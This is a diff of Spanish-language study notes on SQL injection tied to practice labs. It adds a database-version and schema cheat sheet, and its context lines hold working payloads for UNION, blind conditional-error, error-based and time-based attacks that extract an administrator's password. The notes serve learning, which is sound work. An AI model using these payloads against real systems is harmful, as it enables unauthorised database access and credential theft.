@@ -1,6 +1,41 @@
+## Descripción
+SQLi consiste en "inyectar" código malicioso sql con el fin de exfiltrar datos 
+
+## HERRAMIENTAS
+
+[Compilador Online](https://onecompiler.com/mysql)
+
+## CHEAT SHEET DE VARIABLES
+
+```sql
+SQLITE
+
+sqlite_version()
+sqlite_source_id()
+PRAGMA compile_options
+
+MYSQL
+
+VERSION()
+@@version_compile_os
+@@version_compile_machine
+@@default_storage_engine
+SHOW GLOBAL STATUS LIKE 'Uptime'
+
+INFOMACION DE TABLAS
+
+table_name
+table_type
+information_schema.tables
+
+column_name
+data_type
+information_schema.columns
+```
+
 ## SUBSTRING 
 
-```sh
+```sql
 Oracle 	SUBSTR('foobar', 4, 2)
 Microsoft 	SUBSTRING('foobar', 4, 2)
 PostgreSQL 	SUBSTRING('foobar', 4, 2)
@@ -11,7 +46,7 @@ MySQL 	SUBSTRING('foobar', 4, 2)
 
 Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
-```sh
+```sql
 ' UNION SELECT NULL, NULL, NULL --
 ```
 
@@ -23,7 +58,7 @@ Variaciones del Lab UNION:
 
 
 Concatenación
-```sh
+```sql
 Oracle -  'foo'||'bar' 
 Microsoft -  'foo'+'bar' 
 PostgreSQL -  'foo'||'bar' 
@@ -36,7 +71,7 @@ Lab: Blind SQL injection with conditional errors
 
 Primero tenemos que probar que el parametro es vulnerable: 
 
-```sh
+```sql
 ' || (SELECT '' FROM DUAL) || ' 
 
 ESTE LAB USA UNA BASE DE DATOS DE Oracle
@@ -44,19 +79,19 @@ ESTE LAB USA UNA BASE DE DATOS DE Oracle
 
 Después confirmamos que la tabla USERS existe:
 
-```sh
+```sql
 ' || (SELECT '' FROM USERS WHERE ROWNUM =1) || ' 
 ```
 
 Confirmamos que el usuario "administrator" existe en la tabla USERS
 
-```sh
+```sql
 ' || (SELECT '' FROM USERS WHERE username='administrator') || ' 
 ```
 
 Si ponemos esto no sabríamos 
 
-```sh
+```sql
 ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator') || ' 
 ```
 
@@ -66,7 +101,7 @@ Si hay INTERNAL SERVER ERROR -> Username administrador existe
 
 Determinamos el largo del password 
 
-```sh
+```sql
 ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator' and LENGTH(password)>1) || ' 
 ```
 
@@ -74,13 +109,13 @@ Acá jugamos con el length del password para saber cual es, en este caso es 20
 
 Encontrar la contraseña de administrator
 
-```sh
+```sql
 ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username='administrator' and SUBSTR(password,1,1)='a') || ' 
 ```
 
 Se uso un archivo llamado "fuzzer_labsqlerror.py" para automatizar encontrar la contraseña
 
-```sh
+```python
 import requests
 import string
 import urllib.parse
@@ -125,7 +160,7 @@ Lab: Visible error-based SQL injection
 
 Al forzar errores en las solicitudes y que estos errores se puedan visualizar, permite manipular el request con SQLi para ver datos filtrados:
 
-```sh
+```sql
 TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 ```
 
@@ -144,7 +179,7 @@ SOLUCIÓN: TrackingId=x'||pg_sleep(10)--
 
 Para exfiltrar credenciales se usa lo siguiente:
 
-```sh
+```sql
 ' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM USERS)--
 ```
 
